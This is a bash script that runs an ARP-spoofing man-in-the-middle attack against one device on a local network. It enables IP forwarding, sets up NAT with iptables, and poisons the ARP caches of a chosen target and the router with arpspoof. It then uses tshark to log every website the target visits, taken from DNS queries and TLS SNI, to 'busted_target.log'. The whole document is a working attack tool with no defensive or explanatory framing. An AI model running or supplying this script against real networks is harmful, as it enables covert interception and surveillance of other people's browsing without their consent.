#!/bin/bash

# CONFIGURATION
INTERFACE=$(ip route | grep default | awk '{print $5}')
if [ -z "$INTERFACE" ]; then
    echo "[!] Error: Could not detect network interface."
    exit 1
fi

# Set Target Device IP (Change this to the desired target)
TARGET_IP="192.168.0.X"
ROUTER_IP=$(ip route | grep default | awk '{print $3}')
if [ -z "$ROUTER_IP" ]; then
    echo "[!] Error: Could not detect router IP."
    exit 1
fi

LOG_FILE="busted_target.log"

# Function to clean up and restore network settings
cleanup() {
    echo -e "\n[*] Restoring network settings..."
    sudo pkill arpspoof
    sudo iptables --flush
    sudo iptables --table nat --flush
    sudo iptables --delete-chain
    sudo iptables --table nat --delete-chain
    echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
    echo "[*] Cleanup complete. Exiting."
    exit 0
}

# Trap CTRL+C to restore settings before exiting
trap cleanup SIGINT

echo "[*] Using detected network interface: $INTERFACE"
echo "[*] Targeting device: $TARGET_IP"
echo "[*] Detected router IP: $ROUTER_IP"
echo "[*] Enabling IP forwarding..."
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

echo "[*] Setting up NAT with iptables..."
sudo iptables --flush
sudo iptables --table nat --flush
sudo iptables --delete-chain
sudo iptables --table nat --delete-chain
sudo iptables -t nat -A POSTROUTING -o "$INTERFACE" -j MASQUERADE
sudo iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i "$INTERFACE" -o "$INTERFACE" -j ACCEPT

echo "[*] Running ARP spoofing for target ($TARGET_IP)..."
sudo arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$ROUTER_IP" > /dev/null 2>&1 &

sleep 3  # Allow time for ARP spoofing to take effect

echo "[*] Capturing visited websites (Origin IP → Website)..."
sudo tshark -i "$INTERFACE" -Y "tls.handshake.extensions_server_name or dns.qry.name" -T fields -e ip.src -e tls.handshake.extensions_server_name -e dns.qry.name | awk -v target="$TARGET_IP" '{if ($1 == target && $2) print $1, "→", $2}' | tee -a "$LOG_FILE"

# Cleanup is called when the user presses CTRL+C
